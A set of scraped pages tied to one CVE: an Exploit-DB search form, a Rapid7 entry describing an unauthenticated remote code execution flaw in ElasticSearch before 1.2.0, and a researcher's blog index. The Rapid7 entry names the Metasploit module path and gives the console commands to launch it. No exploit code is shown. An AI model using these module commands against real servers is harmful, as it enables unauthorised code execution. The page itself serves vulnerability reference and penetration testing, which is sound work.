| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.rapid7.com_53de3469_20250125_070655.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Contact us](/contact/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

[Contact us](/contact/)

* [Home](/)
* [Vulnerability & Exploit Database](/db/)
* **Modules**

#### Rapid7 Vulnerability & Exploit Database

# ElasticSearch Dynamic Script Arbitrary Java Execution

 [Back to Search](https://www.rapid7.com/db/)

### ElasticSearch Dynamic Script Arbitrary Java Execution

Disclosed
12/09/2013

Created
05/30/2018

#### Description

This module exploits a remote command execution (RCE) vulnerability in ElasticSearch,
exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the
REST API, which does not require authentication, where the search
function allows dynamic scripts execution. It can be used for remote attackers
to execute arbitrary Java code. This module has been tested successfully on
ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3.

#### Author(s)

* Alex Brasetvik
* Bouke van der Bijl
* juan vazquez <juan.vazquez@metasploit.com>

#### Platform

Java

#### Architectures

java

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/elasticsearch/script_mvel_rce.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/multi/elasticsearch/script_mvel_rce.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/multi/elasticsearch/script_mvel_rce
msf exploit(script_mvel_rce) > show targets
    ...targets...
msf exploit(script_mvel_rce) > set TARGET < target-id >
msf exploit(script_mvel_rce) > show options
    ...show and set options...
msf exploit(script_mvel_rce) > exploit
```

### Metasploit

Penetration testing software for offensive security teams.

Key Features

* [Collect and share all the information you need to conduct a successful and efficient penetration test](/products/metasploit/features)
* [Simulate complex attacks against your systems and users](/products/metasploit/features)
* [Test your defenses to make sure they’re ready](/products/metasploit/features)
* [Automate Every Step of Your Penetration Test](/products/metasploit/features)

[Free Metasploit Pro Trial](/try/metasploit-pro/)
[View All Features](/products/metasploit/features/)

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

– Jim O’Gorman | President, Offensive Security

;

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)



=== Content from bouk.co_4fe5edf0_20250125_070651.html ===

## [Bouke van der Bijl](/)

* [Books 2024](/blog/books-2024/)
* [Deelauto Club: All of The Netherlands' car shares on one map](/blog/deelauto-club/)
* [Getting into robotics as a software engineer](/blog/robotics/)
* [Books 2022](/blog/books-2022/)
* [A Couple Small Nix Tips](/blog/nix-tips/)
* [Privacy-conscious Home Automation](/blog/lights/)
* [There is no Magic](/blog/no-magic/)
* [2021](/blog/2021/)
* [Spreadsheet Formulas for Personal Finance](/blog/formulas/)
* [Volunteering for the Informatics Olympiad](/blog/olympiad/)
* [CVE-2021-1831 Shortcuts File Read Outside of Sandbox](/blog/cve-2021-1831/)
* [Quote Books](/blog/quote-books/)
* [Clubhouse](/blog/clubhouse/)
* [Getting TLS certs locally because why not](/blog/lets-tls/)
* [The M1 MacBook Air is the best computer I've ever owned](/blog/macbouk-air/)
* [2020: Corona Days](/blog/2020/)
* [Yes, I use Nix](/blog/nix/)
* [Launching GizmoPack](/blog/gizmopack/)
* [WWDC 2020](/blog/wwdc-2020/)
* [2019: A Year](/blog/2019/)
* [Playing around with shaders](/blog/shaders/)
* [A life of crime](/blog/life-of-crime/)
* [Reflecting on 2018](/blog/2018/)
* [My favorite books of 2017](/blog/books-2017/)
* [How to automatically send RSS articles to Kindle](/blog/rss-to-kindle/)
* [Doubling Go's template performance by generating code](/blog/code-generating-code/)
* [My experience creating a Telegram Bot](/blog/telegram-bots/)
* [Adding some context to Go](/blog/context/)
* [Static files in Go](/blog/static-files/)
* [How to steal any developer's local database](/blog/hacking-developers/)
* [Learning from old code](/blog/learning-from-old-code/)
* [Monkey Patching in Go](/blog/monkey-patching-in-go/)
* [Idiomatic Generics in Go](/blog/idiomatic-generics-in-go/)
* [Insecure default in Elasticsearch enables remote code execution](/blog/elasticsearch-rce/)
* [My road to the International Olympiad in Informatics 2012](/blog/ioi-2012/)

[About Bouke](/about) | [Github](https://github.com/bouk) | Email | [Bluesky](https://bsky.app/profile/bou.ke) | [Mastodon](https://toot.community/%40bouk)| [X](https://twitter.com/BvdBijl)


